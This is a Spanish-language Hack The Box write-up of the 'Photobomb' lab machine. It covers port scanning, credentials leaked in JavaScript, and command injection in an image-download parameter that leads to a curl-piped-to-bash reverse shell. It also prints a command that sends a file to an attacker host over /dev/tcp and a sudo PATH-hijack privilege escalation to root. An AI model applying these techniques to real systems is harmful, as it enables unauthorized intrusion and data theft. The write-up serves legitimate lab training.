---
layout: single
title: <span style="color:#9FEF00">Photobomb </span><span class="htb">-</span><span class="htb"> Hack The Box </span><span class="htb">-</span><span class="htb">ESP</span>
excerpt: "Photobomb es una máquina Linux sencilla en la que se utilizan credenciales en texto plano para acceder a una aplicación web interna con una funcionalidad `Download` que es vulnerable a una inyección ciega de comandos. Una vez establecido un punto de apoyo como usuario principal de la máquina, se aprovecha un script de shell mal configurado que hace referencia a binarios sin sus rutas completas para obtener privilegios escalados, ya que se puede ejecutar con `sudo`."
date: 2024-02-24
classes: wide
header:
  teaser: /assets/images/Photobomb/Logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - Hack The Box
  - Linux 
  - eWPT
  - OSCP
tags: 
  - Virtual Hosting 
  - Web Enumeration 
  - Information Leakage - Credentials in Javascript File
  - Abusing Image Download Utility (Command Injection) [RCE]
  - Abusing Sudoers privilege + PATH Hijacking (find command) [1st way] [Privilege Escalation]
  - Abusing Sudoers privilege + PATH Hijacking ( ] command ) [2st way] [Privilege Escalation]
 

---
<h3 style="text-align:center">DESCRIPCIÓN</h3><hr>

Photobomb es una máquina Linux sencilla en la que se utilizan credenciales en texto plano para acceder a una aplicación web interna con una funcionalidad `Download` que es vulnerable a una inyección ciega de comandos. Una vez establecido un punto de apoyo como usuario principal de la máquina, se aprovecha un script de shell mal configurado que hace referencia a binarios sin sus rutas completas para obtener privilegios escalados, ya que se puede ejecutar con `sudo`.


![](../assets/images/Photobomb/PortadaPhoto.png)

<h3 style="text-align:center">INDICE</h3><hr>

- [Reconocimiento](#fase-de-reconocimiento)
    - [Enumeración de puertos](#enumeracion-de-puertos)
    - [Enumeración de servicios](#enumeracion-de-servicios)
- [Explotación](#explotacion)
    - [Abusing Image Download Utility (Command Injection)](#commandinjection)
- [Escalada de privilegios](#escalada-de-privilegios)
- [Autores y referencias](#autores-y-referencias)


<h3 style="text-align:center" id="fase-de-reconocimiento">RECONOCIMIENTO</h3><hr>

El objetivo principal de la etapa de reconocimiento es obtener una visión general de la infraestructura, sistemas, aplicaciones y posibles puntos débiles de la organización o sistema que se va a someter a la prueba de penetración. Esta información es esencial para planificar y ejecutar el resto del proceso de pentesting de manera más efectiva.

Durante la etapa de reconocimiento, el equipo de pentesting puede realizar diferentes acciones y técnicas, que incluyen:

1.Búsqueda de información pública: Se recopila información de dominios, subdominios, direcciones IP, registros de DNS, información de contacto de la empresa, etc., que está disponible públicamente a través de fuentes como el sitio web de la empresa, registros WHOIS, redes sociales, motores de búsqueda, entre otros.

2.Escaneo de red: Se utilizan herramientas de escaneo de puertos y servicios para identificar los sistemas en línea y los puertos abiertos en el objetivo. Esto ayuda a tener una idea de la infraestructura de red y los servicios disponibles.

3.Enumeración de servicios: Una vez identificados los servicios y puertos abiertos, se intenta obtener información más detallada sobre los servicios, como las versiones de software, para determinar si existen vulnerabilidades conocidas asociadas con esos servicios.

4.Búsqueda de subdominios y directorios ocultos: Se busca información adicional sobre posibles subdominios, directorios ocultos o páginas web no enlazadas públicamente, lo que podría revelar puntos de entrada adicionales o información sensible.

5.Análisis de arquitectura de red: Se investiga la topología de la red para comprender la relación entre diferentes sistemas y cómo se conectan, lo que ayuda a identificar posibles rutas para movimientos laterales.

6.Búsqueda de vulnerabilidades conocidas: Se investigan bases de datos de vulnerabilidades conocidas y bases de datos de exploits para identificar posibles vulnerabilidades que puedan existir en el software o servicios utilizados por el objetivo.

- Lo primero que vamos hacer es un ping a la maquina victima ping -c 1 10.10.11.182 ping: Es el comando utilizado para enviar solicitudes de eco (ping) a una dirección IP específica para verificar la conectividad de red y la latencia de la conexión. -c 1: Es una opción que se utiliza para especificar el número de solicitudes de eco que se enviarán. En este caso, se envía solo una solicitud (-c 1). 10.10.11.182: Es la dirección IP del host o máquina que será objeto del comando ping.

```ruby
❯ ping -c 1 10.10.11.182
PING 10.10.11.182 (10.10.11.182) 56(84) bytes of data.
64 bytes from 10.10.11.182: icmp_seq=1 ttl=63 time=165 ms

--- 10.10.11.182 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 164.648/164.648/164.648/0.000 ms
```
El TTL---> 63 indica que es una máquina Linux

Con whichSytem.py nos arroja ante que nos estamos enfrentando con solo poner la dirección ip.
```ruby
❯ whichSystem.py 10.10.11.182
10.10.11.182 (ttl -> 63): Linux

```

Si quieren esa utilidad la guardan en el -usr-bin
```python
#!/usr/bin/python3
#coding: utf-8

import re, sys, subprocess

# python3 wichSystem.py 10.10.10.188 

if len(sys.argv) != 2:
    print("\n[!] Uso: python3 " + sys.argv[0] + " <direccion-ip>\n")
    sys.exit(1)

def get_ttl(ip_address):

    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
    (out,err) = proc.communicate()

    out = out.split()
    out = out[12].decode('utf-8')

    ttl_value = re.findall(r"\d{1,3}", out)[0]

    return ttl_value

def get_os(ttl):

    ttl = int(ttl)

    if ttl >= 0 and ttl <= 64:
        return "Linux"
    elif ttl >= 65 and ttl <= 128:
        return "Windows"
    else:
        return "Not Found"

if __name__ == '__main__':

    ip_address = sys.argv[1]

    ttl = get_ttl(ip_address)

    os_name = get_os(ttl)
	print("%s (ttl -> %s): %s" % (ip_address, ttl, os_name))
```

<h3 style="text-align:center" id="enumeracion-de-puertos">ENUMERACIÓN DE PUERTOS</h3><hr>
Realizamos un escaneo de puertos usando la herramienta `nmap`:

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG scanPorts`

Veamos el significado de cada opción utilizada en el comando:

- `nmap`: Es el comando para ejecutar la herramienta de escaneo de puertos `nmap`.
    
- `-p-`: Esta opción indica que se deben escanear todos los puertos, es decir, desde el puerto 1 hasta el puerto 65535.
    
- `--open`: Filtra los resultados del escaneo para mostrar solo los puertos que están abiertos, es decir, aquellos que responden a la solicitud de escaneo.
    
- `-sS`: Indica un escaneo de tipo “SYN scan”. Este tipo de escaneo envía paquetes SYN (sincronización) a los puertos y analiza las respuestas para determinar si están abiertos, cerrados o filtrados por firewall.
    
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes. En este caso, se envían al menos 5000 paquetes por segundo.
    
- `-vvv`: Habilita el modo de salida muy detallado, lo que significa que se mostrarán niveles de verbosidad muy altos para obtener información detallada del escaneo.
    
- `-n`: Indica que no se realice la resolución de DNS para las direcciones IP, lo que acelera el escaneo.
    
- `-Pn`: Esta opción indica que no se realice el “ping” para determinar si los hosts están en línea o no. Se ignoran las respuestas del ping y se escanea directamente.
    
- `10.10.11.182`: Es la dirección IP del objetivo que será escaneado.
    
- `-oG scanPorts`: Especifica que se debe guardar la salida del escaneo en un formato “grepable” (formato de texto plano) con el nombre de archivo “scanPorts”.

```ruby
❯ nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG scanPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 20:49 -05
Initiating SYN Stealth Scan at 20:49
Scanning 10.10.11.182 [65535 ports]
Discovered open port 80/tcp on 10.10.11.182
Discovered open port 22/tcp on 10.10.11.182
Completed SYN Stealth Scan at 20:49, 13.83s elapsed (65535 total ports)
Nmap scan report for 10.10.11.182
Host is up, received user-set (0.16s latency).
Scanned at 2024-03-04 20:49:37 -05 for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds
           Raw packets sent: 67624 (2.975MB) | Rcvd: 67552 (2.702MB)
```

Escaneamos al objetivo con los scripts básicos de reconocimiento de nmap, apuntando a los puertos abiertos en busca de más información. Los resultados incluirán información sobre los servicios que se están ejecutando en los puertos escaneados y sus versiones correspondientes.

`nmap -sCV -p21,80 10.10.11.182 -oN targeted`

```ruby
❯ nmap -p22,80 -sCV 10.10.11.182 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-04 20:50 -05
Nmap scan report for 10.10.11.182 (10.10.11.182)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
```

- Tenemos el puerto 22 abierto SSH pero como la versión es mayor a la 7.7 no  realizar enumeración de usuarios, no tenemos credenciales de ingreso
- Tenemos el puerto 80, lo que nos arroja indica que es una interfaz web 



<h3 style="text-align:center" id="enumeracion-de-servicios">ENUMERACIÓN DE SERVICIOS</h3><hr>

- Con whatweb podemos realizar un escaneo para ver las tecnologías que están corriendo por detrás, las versiones. 

```ruby
❯ whatweb 10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

- Tenemos el código 302 que nos indica que esta redirigiendo la pagina a http://10.10.11.182:55555/web asi que vamos a ver de que se trata
![](../assets/images/Photobomb/web1.png)
- Tenemos un panel de autenticación pero no conocemos las credenciales validas.
![](../assets/images/Photobomb/web2.png)
- Vemos si existe el recurso index.php o index.html 
![](../assets/images/Photobomb/web3.png)
- No existe el recurso, pero algo que podemos hacer es ver desde donde esta llamando la imagen que no esta cargando correctamente.
![](../assets/images/Photobomb/web4.png)
- Vemos que la esta llamando desde el localhost por el puerto 4567, veamos si existe el recurso por el puerto 80.
![](../assets/images/Photobomb/web5.png)
- Como el recurso existe, podemos hacer una sustitución en Burpsuite para que me cargue de manera automática. 
![](../assets/images/Photobomb/web6.png)
- Interceptamos la petición y capturamos la respuesta 
![](../assets/images/Photobomb/web7.png)
- Esta es la respuesta que vamos a cambiar, en la sección Match and replace rules realizamos el cambio. 
![](../assets/images/Photobomb/web8.png)
![](../assets/images/Photobomb/web9.png)
- Esto se hace mas para ver la imagen y hacer las cosas mas limpias. 
- Vemos el código fuente y hay un archivo photobomb.js que vamos a ver de que se trata, para eso lo vamos a traer a nuestra máquina. 
![](../assets/images/Photobomb/web10.png)
![](../assets/images/Photobomb/web11.png)
```ruby
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

-  (`http://pH0t0:b0Mb@photobomb.htb/printer`). Esto indica que la URL contiene credenciales de autenticación embebidas (`pH0t0:b0Mb` como el nombre de usuario y contraseña) para el acceso a dicho recurso, vamos a probar esas credenciales.
![](../assets/images/Photobomb/web12.png)
- Logramos ingresar.
![](../assets/images/Photobomb/web13.png)
- Vemos un botón para descargar imágenes, nos descargamos una para luego analizarla.
```ruby
❯ exiftool test.jpg
ExifTool Version Number         : 12.76
File Name                       : test.jpg
Directory                       : .
File Size                       : 273 kB
File Modification Date/Time     : 2024:03:04 21:38:46-05:00
File Access Date/Time           : 2024:03:04 21:42:21-05:00
File Inode Change Date/Time     : 2024:03:04 21:42:31-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : c2
Profile Copyright               : IX
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
Image Width                     : 3000
Image Height                    : 2000
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3000x2000
Megapixels                      : 6.0
```
- No vemos información que nos pueda ser útil, vamos a descar otra imagen mas pequeña para ver si comportamiento.
![](../assets/images/Photobomb/web14.png)
- Tenemos dos tamaños diferentes, lo que nos puede indicar que por detrás hay un comando de linux que nos permite hacer el escalado de la imagen  por ejemplo:
``convert test.jpg -resize 500x500 new.jpg`` 
![](../assets/images/Photobomb/web15.png)

<h3 style="text-align:center" id="explotacion">EXPLOTACIÓN</h3><hr>

- Vamos a interceptar la petición de descarga con burpsuite para ver como se está tramitando la petición. 
![](../assets/images/Photobomb/web16.png)

<h3 style="text-align:center" id="commandinjection">Abusing Image Download Utility (Command Injection)</h3><hr>

- Como input vemos que envía un nombre aleatorio, el tipo de archivo y la dimensión, en estos casos podríamos inyectar comandos en este input, probamos con un sleep de 5 segundos.
![](../assets/images/Photobomb/web17.png)
- Al inyectar un sleep+5 la pagina se demora 5 segundos en responder, lo que indica que es vulnerable a RCE, el + es una manera de indicar el espacio.
- Probamos si tiene curl para que me haga una petición a un servidor web de python, si se realiza la petición podría cargar un index.html que sea interpretado con bahs y me devuelva una shell. 
![](../assets/images/Photobomb/web18.png)
![](../assets/images/Photobomb/web19.png)
- Efectivamente realiza la petición, ahora creamos el archivo html. 
![](../assets/images/Photobomb/web20.png)
- Realizamos la petición para que el index sea interpretado con bash, nos podemos en escucha por el puerto 443 y montamos el servidor python.

![](../assets/images/Photobomb/web21.png)
![](../assets/images/Photobomb/web22.png)
- Realizamos un tratamiento de la tty 
Tratamiento de la tty

- `script /dev/null -c bash`
- Hacemos un CTRL+Z
- `stty raw -echo; fg` 
- `reset xterm` damos enter
 - `export TERM=xterm`
 - `stty rows 44 columns 184`

![](../assets/images/Photobomb/web23.png)
- Vemos que estamos en la máquina victima y no en un contenedor.

![](../assets/images/Photobomb/web24.png)
- Estamos ante un ubuntu focal

![](../assets/images/Photobomb/web25.png)
- Vemos la primera flag

<h3 style="text-align:center" id="escalada-de-privilegios">Escalada de Privilegios</h3><hr>


- Enumeración de la máquina
- `id`

![](../assets/images/Photobomb/web26.png)

- `sudo -l`

![](../assets/images/Photobomb/web27.png)

- Podemos ejecutar con permiso root el archivo cleanup.sh
- Vamos analizar el script 

![](../assets/images/Photobomb/web28.png)

El script `cleanup.sh` parece ser un script de mantenimiento para un servidor o una aplicación llamada "photobomb". Aquí está lo que hace cada parte del script:

1. `wizard@photobomb:~$ cat /opt/cleanup.sh` - Este comando se está utilizando para mostrar el contenido del script `cleanup.sh` que se encuentra en el directorio `/opt/`.

2. `#!/bin/bash` - Esta es la 'shebang' que indica que el script debe ejecutarse utilizando el intérprete Bash.

3. `. /opt/.bashrc` - Este comando (equivalente a `source /opt/.bashrc`) carga la configuración del shell Bash desde el archivo `.bashrc` ubicado en `/opt/`. Esto puede ser utilizado para establecer variables de entorno, funciones y otros ajustes que el script podría necesitar.

4. `cd /home/wizard/photobomb` - Cambia el directorio actual del script a `/home/wizard/photobomb`.

5. `# clean up log files` - Esto es un comentario que explica que la siguiente sección del script se encargará de limpiar los archivos de registro.

6. El bloque `if` comprueba dos condiciones para el archivo `log/photobomb.log`:
   - `-s log/photobomb.log` verifica si el archivo de log existe y no está vacío.
   - `! [ -L log/photobomb.log ]` verifica que el archivo de log no sea un enlace simbólico.

   Si ambas condiciones son verdaderas, entonces ejecuta dos comandos:
   - `/bin/cat log/photobomb.log > log/photobomb.log.old` copia el contenido del archivo de log actual a un nuevo archivo llamado `photobomb.log.old`.
   - `/usr/bin/truncate -s0 log/photobomb.log` vacía el archivo de log actual sin eliminarlo, estableciendo su tamaño a 0 bytes.

7. `# protect the priceless originals` - Otro comentario que indica que la siguiente sección del script se encarga de proteger archivos originales.

8. El comando `find source_images -type f -name '*.jpg' -exec chown root:root {} \;` busca en el directorio `source_images` todos los archivos de tipo regular (`-type f`) con la extensión `.jpg` y cambia su propiedad al usuario y grupo `root`. Esto significa que sólo el superusuario (root) tendrá los permisos de propiedad sobre estos archivos, lo que protege estos archivos de ser modificados o borrados por otros usuarios.

- Ahora vemos el /opt/.bashrc y lo interpretamos con bash,  `cat /opt/.bashrc | grep -v "^#" > /dev/tcp/10.10.14.5/443` el grep es para quitar todos los comentarios. 
![](../assets/images/Photobomb/web29.png)

![](../assets/images/Photobomb/web30.png)
- `enable -n [ # ]` En esta linea lo que hace es desactivar el comano `[` que es un comando propio de linux, podriamos aprovecharnos de eso, para cambiar su contenido y realizar un PATH Hijacking 

- Vamos al directio /tmp y creamos un archivo llamado `[` en el comando llamamos una bahs, y como quien lo ejecuta es root, nos devuelve una consola con permisos de root, para ello debemos cambiar el path.
![](../assets/images/Photobomb/web31.png)
- Damos permisos de ejecución `chmod +x [`  
- `sudo PATH=/tmp:$PATH /opt/cleanup.sh` de esta manera cambiamos el path para que inicie desde la carpeta tmp y como va a ejecutar el archivo llamado `[` nos devuelve la bash  
![](../assets/images/Photobomb/web32.png)
- También podríamos aprovecharnos del comando find, porque no lo llama desde su ruta absoluta en el script /opt/cleanup.sh 
![](../assets/images/Photobomb/web33.png)


<h3 style="text-align:center" id="autores-y-referencias">AUTORES y REFERENCIAS</h3><hr>

Autor del write up: John Osorio (Balthael) <a href="https://app.hackthebox.com/profile/1366059" target="_blank">HTB</a>. Si quieres contactarme por cualquier motivo lo puedes hacer a través de <a href="https://www.instagram.com/joh_sb/" target="_blank">Instagram</a>.

Autor de la máquina:  <em>slartibartfast </em>, muchas gracias por la creación de Inject, la disfrute mucho, aquí el link de la máquina <a href="https://www.hackthebox.com/machines/photobomb" target="_blank">HTB</a>.
